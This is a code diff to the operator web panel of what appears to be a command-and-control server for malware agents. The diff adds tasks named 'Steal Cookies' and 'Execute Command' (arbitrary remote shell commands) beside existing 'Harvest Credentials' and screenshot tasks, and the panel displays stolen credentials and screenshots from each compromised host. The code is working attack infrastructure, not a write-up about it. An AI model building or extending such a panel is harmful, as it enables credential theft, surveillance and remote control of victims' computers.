@@ -77,9 +77,10 @@
                     <div class="d-flex">
                         <select id="taskType" class="form-select form-select-sm me-2" required>
                             <option value="">Select Task</option>
-                            <option value="websocket">WebSocket Terminal</option>
+                            <option value="steal_cookies">Steal Cookies</option>
                             <option value="screenshot">Take Screenshot</option>
                             <option value="harvest_creds">Harvest Credentials</option>
+                            <option value="shell">Execute Command</option>
                         </select>
                         <button id="executeTask" class="btn btn-sm btn-primary">Execute</button>
                     </div>
@@ -170,149 +171,66 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.3/js/lightbox-plus-jquery.min.js"></script>
 <script>
-
-document.getElementById('terminal-btn').addEventListener('click', function() {
-    // First send a task to start WebSocket
-    fetch('/api/task', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            agent_id: '{{ agent.id }}',
-            task_type: 'websocket',
-            task_data: {
-                action: 'start'
-            }
-        })
-    }).then(response => response.json())
-    .then(data => {
-        if (data.status === 'success') {
-            // Then open the terminal page
-            window.location.href = `/terminal/{{ agent.id }}`;
-        } else {
-            alert('Failed to start WebSocket: ' + (data.message || 'Unknown error'));
-        }
-    });
-});
 document.addEventListener('DOMContentLoaded', function() {
-    // Task execution code (unchanged)
+    // Task execution handler
     const executeBtn = document.getElementById('executeTask');
     if (executeBtn) {
         executeBtn.addEventListener('click', async function() {
+            const taskType = document.getElementById('taskType').value;
+            if (!taskType) {
+                alert('Please select a task type');
+                return;
+            }
+
+            let taskData = {};
+            
+            // Add specific data for certain task types
+            if (taskType === 'shell') {
+                const command = prompt('Enter command to execute:');
+                if (!command) return;
+                taskData = { 'cmd': command };
+            }
+
             try {
-                const taskType = document.getElementById('taskType').value;
-                if (!taskType) {
-                    alert('Please select a task type');
-                    return;
-                }
-
-                const taskData = {
-                    agent_id: "{{ agent.id }}",
-                    task_type: taskType
-                };
-
-                const response = await fetch("{{ url_for('create_task') }}", {
+                const response = await fetch('/api/task', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     },
-                    body: JSON.stringify(taskData)
+                    body: JSON.stringify({
+                        agent_id: "{{ agent.id }}",
+                        task_type: taskType,
+                        task_data: taskData
+                    })
                 });
 
-                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-                
                 const data = await response.json();
+                
+                if (!response.ok) {
+                    throw new Error(data.message || 'Failed to create task');
+                }
+
                 if (data.status === 'success') {
-                    alert('Task created successfully!');
+                    alert(`Task created successfully! Task ID: ${data.task_id}`);
                     refreshAgentDetail();
                 } else {
-                    alert('Error: ' + (data.message || 'Unknown error'));
+                    throw new Error(data.message || 'Unknown error');
                 }
             } catch (error) {
                 console.error('Error:', error);
-                alert('Failed to create task: ' + error.message);
+                alert(`Failed to create task: ${error.message}`);
             }
-
         });
     }
-    // Connect to screenshots namespace for this agent
-    const screenshotSocket = io('/screenshots');
-    screenshotSocket.emit('join_screenshots', { agent_id: "{{ agent.id }}" });
 
-    // Handle new screenshots
-    screenshotSocket.on('screenshot_added', function(data) {
-        if (data.agent_id === "{{ agent.id }}") {
-            refreshScreenshotsSection();
-        }
-    });
-
-    // Handle deleted screenshots
-    screenshotSocket.on('screenshot_deleted', function(data) {
-        if (data.agent_id === "{{ agent.id }}") {
-            refreshScreenshotsSection();
-        }
-    });
-
-    // Handle errors
-    screenshotSocket.on('screenshots_error', function(data) {
-        console.error('Screenshots error:', data.error);
-        showToast('Screenshots error: ' + data.error, 'error');
-    });
-
-    // Refresh just the screenshots section
-    async function refreshScreenshotsSection() {
-        try {
-            const response = await fetch("{{ url_for('agent_detail', agent_id=agent.id) }}", {
-                headers: {
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'Cache-Control': 'no-cache'
-                },
-                cache: 'no-store'
-            });
-            
-            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-            
-            const html = await response.text();
-            const parser = new DOMParser();
-            const newDoc = parser.parseFromString(html, 'text/html');
-            
-            const newScreenshots = newDoc.getElementById('screenshots-container');
-            if (newScreenshots) {
-                document.getElementById('screenshots-container').innerHTML = newScreenshots.innerHTML;
-            } else {
-                document.getElementById('screenshots-section').innerHTML = 
-                    newDoc.getElementById('screenshots-section').innerHTML;
-            }
-            
-            if (typeof lightbox !== 'undefined') {
-                lightbox.init();
-            }
-        } catch (error) {
-            console.error('Error refreshing screenshots:', error);
-        }
-    }
-
-    function showToast(message, type = 'success') {
-        // Implement your toast notification system here
-        alert(message); // Temporary simple alert
-    }
-    
-    // Improved refresh functionality
-    let isRefreshing = false;
-    
+    // Refresh functionality
     async function refreshAgentDetail() {
-        if (isRefreshing) return;
-        isRefreshing = true;
-        
         try {
             const response = await fetch(window.location.href, {
                 headers: {
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'Cache-Control': 'no-cache'
-                },
-                cache: 'no-store'
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
             });
             
             if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
@@ -322,31 +240,30 @@ document.addEventListener('DOMContentLoaded', function() {
             const newDoc = parser.parseFromString(html, 'text/html');
             
             // Update agent info
-            updateElementContent(newDoc, 'agent-hostname');
-            updateElementContent(newDoc, 'agent-status');
-            updateElementContent(newDoc, 'agent-id');
-            updateElementContent(newDoc, 'agent-ip');
-            updateElementContent(newDoc, 'agent-os');
-            updateElementContent(newDoc, 'agent-last-seen');
-            
-            // Update status badge class
-            const statusBadge = document.getElementById('agent-status');
-            const newStatusBadge = newDoc.getElementById('agent-status');
-            if (statusBadge && newStatusBadge) {
-                statusBadge.className = newStatusBadge.className;
-            }
-            
-            // Update privilege badge class and content
-            updateElementContent(newDoc, 'agent-privilege');
-            const privilegeBadge = document.getElementById('agent-privilege');
-            const newPrivilegeBadge = newDoc.getElementById('agent-privilege');
-            if (privilegeBadge && newPrivilegeBadge) {
-                privilegeBadge.className = newPrivilegeBadge.className;
-            }
+            document.getElementById('agent-hostname').textContent = 
+                newDoc.getElementById('agent-hostname').textContent;
+            document.getElementById('agent-status').textContent = 
+                newDoc.getElementById('agent-status').textContent;
+            document.getElementById('agent-status').className = 
+                newDoc.getElementById('agent-status').className;
+            document.getElementById('agent-id').textContent = 
+                newDoc.getElementById('agent-id').textContent;
+            document.getElementById('agent-ip').textContent = 
+                newDoc.getElementById('agent-ip').textContent;
+            document.getElementById('agent-os').textContent = 
+                newDoc.getElementById('agent-os').textContent;
+            document.getElementById('agent-last-seen').textContent = 
+                newDoc.getElementById('agent-last-seen').textContent;
+            document.getElementById('agent-privilege').textContent = 
+                newDoc.getElementById('agent-privilege').textContent;
+            document.getElementById('agent-privilege').className = 
+                newDoc.getElementById('agent-privilege').className;
             
             // Update tables
-            updateTableContent(newDoc, 'tasks-container');
-            updateTableContent(newDoc, 'creds-container');
+            document.getElementById('tasks-container').innerHTML = 
+                newDoc.getElementById('tasks-container').innerHTML;
+            document.getElementById('creds-container').innerHTML = 
+                newDoc.getElementById('creds-container').innerHTML;
             
             // Update screenshots
             const newScreenshots = newDoc.getElementById('screenshots-container');
@@ -357,65 +274,20 @@ document.addEventListener('DOMContentLoaded', function() {
                     newDoc.getElementById('screenshots-section').innerHTML;
             }
             
-            // Reinitialize lightbox if it exists
+            // Reinitialize lightbox
             if (typeof lightbox !== 'undefined') {
                 lightbox.init();
             }
-            
         } catch (error) {
             console.error('Refresh failed:', error);
-        } finally {
-            isRefreshing = false;
-        }
-    }
-    
-    function updateElementContent(newDoc, elementId) {
-        const newElement = newDoc.getElementById(elementId);
-        if (newElement) {
-            const currentElement = document.getElementById(elementId);
-            if (currentElement && currentElement.textContent !== newElement.textContent) {
-                currentElement.textContent = newElement.textContent;
-            }
-        }
-    }
-    
-    function updateTableContent(newDoc, tableBodyId) {
-        const newTableBody = newDoc.getElementById(tableBodyId);
-        if (newTableBody) {
-            const currentTableBody = document.getElementById(tableBodyId);
-            if (currentTableBody && currentTableBody.innerHTML !== newTableBody.innerHTML) {
-                currentTableBody.innerHTML = newTableBody.innerHTML;
-            }
         }
     }
 
     // Manual refresh
-    document.getElementById('manualRefresh').addEventListener('click', function() {
-        refreshAgentDetail();
-    });
+    document.getElementById('manualRefresh').addEventListener('click', refreshAgentDetail);
 
-    // Auto-refresh with visibility check
-    let refreshInterval;
-    function setupRefresh() {
-        refreshInterval = setInterval(() => {
-            if (!document.hidden) {
-                refreshAgentDetail();
-            }
-        }, 5000);
-    }
-    
-    // Handle visibility changes
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            clearInterval(refreshInterval);
-        } else {
-            setupRefresh();
-            refreshAgentDetail(); // Immediate refresh when tab becomes visible
-        }
-    });
-    
-    // Initial setup
-    setupRefresh();
+    // Auto-refresh every 5 seconds
+    setInterval(refreshAgentDetail, 5000);
 });
 </script>
 {% endblock %}
